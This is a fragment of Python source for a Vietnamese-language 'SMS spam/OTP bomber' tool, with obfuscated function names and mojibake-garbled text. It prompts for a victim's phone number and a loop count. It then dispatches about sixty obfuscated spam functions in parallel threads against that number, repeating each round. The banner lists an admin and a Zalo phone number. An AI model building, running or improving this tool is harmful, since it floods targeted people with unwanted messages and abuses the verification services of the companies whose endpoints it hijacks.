def LJJJJLJIJLLJLJILJLIILLIIL(phone, i):
    # Danh s√°ch c√°c h√†m SMS Spam
    functions = [
        XWXWWWXWWWXXXXXXWW, lIlIlllllllIllIlI, S2S22SS22SSSSSSSSS2SS, OODOOooDoOOoOoOooDD,
        JIILIILJJILJJILJIILLJILI, S222SSSSSS222S2SS2SS22222S, lIIllIlllIIllIIlIllI, DOOOOoDDDOODDDDoDooO,
        llIllIIIIlIlIIlIlIlll, NMMNNNMMNMMMMNNNM, XWWWWXWXWXXXXXXWXXW, MNMNNNMNMNMNNNMMNNMN,
        OO00OoO0o0Oo0ooOOo0OOO0o, Oo0oO0ooooo0O000O0ooO, LJIJIILJJJLIJLJJILJ, IlIIIlIlllIlIIlIlIlll,
        IlIIlllIIlIIIIlIIllIll, ODoOODODDOOOOOODDoDDOO, XXWXWWWXXXXXXWXXXWXXX, OOoO0O0OO000Oo00OooO0O0o,
        xxwxxxxxxxwwwxwwwxxxxwx, JLJLLIJJLJLJIIIIJLLLJJJJL, oOOoDDDDoOoDoOoooO, lIlIIIIIIIIlIlIIlllI,
        XWWWWXWXXWXXXXXXWXW, O00oOoOo0O0Oo0OO00OO0, WWWWWWXWXWXWXXWWW, xxwxxxxxxxxwwwxwwwxxxxwx,
        IllIIlIIIlIIlIIlIlI, xxwwwxwwwwxwxwwxxx, lljjjjliiiljijljli, liljliiiijijljljl,
        O0O0OOoOoO0oOoOOOOoo0oOOO0, NMNMMMMNMNMNMMNMNN, DOooOoOOOODoODoooDO, S22SSS2SSSS22222SSS22, 
        IIIIllllIllIIIIllIIIllI, IIllIllIlllIlllII, mmnnmnmnnmmmnnmnmmmmm, jijjlljjjijjiiijjiilii,
        WWWXXXWWXXXWWWXWWXWXWX, XXWWXWWWXXWXWXXXXXW, IJIILJILJLLLJJLLJLJILII, SS2S22SSSS2S2SS22SSS, 
        mmnmnnmnnnmmmnmmmnmnnmm, MMNMMMMMMNNMNMMNNMMM, jljijilllljjlijjjll, WXXXXWXWWWXWWWXXWXWXXXXXX,
        MMNMMNMMMNNMNNNMNNN, WWXXWWXWWXXWWXWWWWW, IILLILJLLLJLIJIJJ, jijiijjijllijijji,
        WXWWXWXWWWWWXXWWXXWXW, jjljjljjilijijjiljljjiil, OOooDOOoOODOOOoDOoOo, ljlljjlljiiiljljjlij,
        SS22SSSS22222S2SS2S2S, jjliliijiijijllijlll, nmnmnnmnmmnmmmmmnm, lIllIlIIlllIllllIIIII, MNMNNNNNNNNMNMNMNNMMNM, JLLLLILLJIILJLIILIIJIJLJ,
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'{Fore.RED}ƒê√£ x·∫£y ra l·ªói trong thread:{Style.RESET_ALL} {exc}')

    print(f"\n{Fore.CYAN}--- {Style.BRIGHT}V√≤ng {i} ƒê√£ Ho√†n Th√†nh. {Style.RESET_ALL}")
    for j in range(4, 0, -1):
        print(f"{Fore.YELLOW}Vui l√≤ng ch·ªù {j} gi√¢y... {Style.RESET_ALL}", end="\r")
        time.sleep(1)

def start_spam_sms_tool():
    clear_screen()
    print(f"""
{Fore.CYAN}‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Info ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
{Fore.YELLOW} ‚ûú {Fore.WHITE}Admin‚≠ê: B√¨nh üíå(
{Fore.YELLOW} ‚ûú {Fore.WHITE}Zalo : üî∞0377994308.
{Fore.YELLOW} ‚ûú {Fore.WHITE}TOOL G·ªòP üå†üí¨
{Fore.YELLOW} ‚ûú {Fore.WHITE}CH·ª®C NƒÇNG SMS SPAM/OTP BOMBER‚öî
{Fore.CYAN}‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
    """)
    
    phone = input(f"{Fore.BLUE}Nh·∫≠p SƒêT n·∫°n nh√¢n (v√≠ d·ª•: 0912345678): {Fore.YELLOW}")
    
    # Chu·∫©n h√≥a SƒêT (lo·∫°i b·ªè kho·∫£ng tr·∫Øng, d·∫•u tr·ª´)
    phone = phone.strip().replace(' ', '').replace('-', '')
    
    if not phone.isdigit() or len(phone) < 9:
        print(f"{Fore.RED}SƒêT kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p l·∫°i.{Style.RESET_ALL}")
        sleep(2)
        return

    try:
        count = int(input(f"{Fore.BLUE}Nh·∫≠p s·ªë l·∫ßn spam (V√≤ng l·∫∑p): {Fore.YELLOW}"))
    except ValueError:
        print(f"{Fore.RED}S·ªë l·∫ßn spam kh√¥ng h·ª£p l·ªá! M·∫∑c ƒë·ªãnh l√† 1.{Style.RESET_ALL}")
        count = 1
    
    print(f"\n{Fore.GREEN}*** B·∫ÆT ƒê·∫¶U SPAM SƒêT: {phone} - S·ªê V√íNG: {count} ***{Style.RESET_ALL}\n")

    try:
        for i in range(1, count + 1):
            LJJJJLJIJLLJLJILJLIILLIIL(phone, i)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Ch∆∞∆°ng tr√¨nh b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng (Ctrl+C). Quay l·∫°i Menu ch√≠nh.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}ƒê√£ x·∫£y ra l·ªói kh√¥ng mong mu·ªën trong qu√° tr√¨nh spam: {e}{Style.RESET_ALL}")

    sleep(3)


